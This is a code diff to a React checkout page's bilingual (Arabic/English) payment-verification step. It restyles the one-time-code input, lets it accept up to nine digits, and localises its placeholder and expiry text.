@@ -906,29 +906,30 @@ export default function BuyPage() {
 
             {stage === 3 && (
               <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
-                <div className="cc-otp-panel buy-span-2">
+                <div className="cc-otp-card buy-span-2">
                   <div className="cc-otp-title">{isRtl ? 'تحقق من الدفع' : 'Payment Verification'}</div>
                   <div className="cc-otp-sub">{isRtl ? 'أدخل كود التحقق الذي وصلك' : 'Enter the verification code you received'}</div>
 
-                  <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left', marginTop: '1rem' }}>
+                  <label className="input-label cc-otp-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                     {isRtl ? 'أدخل كود التحقق (3-9 أرقام)' : 'Verification code (3-9 digits)'}
                   </label>
-                  <input
-                    className="input-control"
-                    value={otpCode}
-                    onChange={(e) => setOtpCode(String(e.target.value).replace(/\D/g, '').slice(0, 6))}
-                    placeholder="12345"
-                    dir="ltr"
-                    inputMode="numeric"
-                    style={{ textAlign: 'left' }}
-                  />
+                  <div className="cc-otp-input-wrap">
+                    <input
+                      className="input-control cc-otp-input"
+                      value={otpCode}
+                      onChange={(e) => setOtpCode(String(e.target.value).replace(/\D/g, '').slice(0, 9))}
+                      placeholder={isRtl ? 'ادخل الرمز' : 'Enter code'}
+                      dir="ltr"
+                      inputMode="numeric"
+                      style={{ textAlign: 'left' }}
+                    />
+                  </div>
 
                   {otpExpiresAt && (
-                    <div className="text-muted text-sm mt-2" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                    <div className="cc-otp-exp" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                       {isRtl ? 'صلاحية الكود: 10 دقائق' : 'OTP validity: 10 minutes'}
                     </div>
                   )}
-
                 </div>
               </div>
             )}
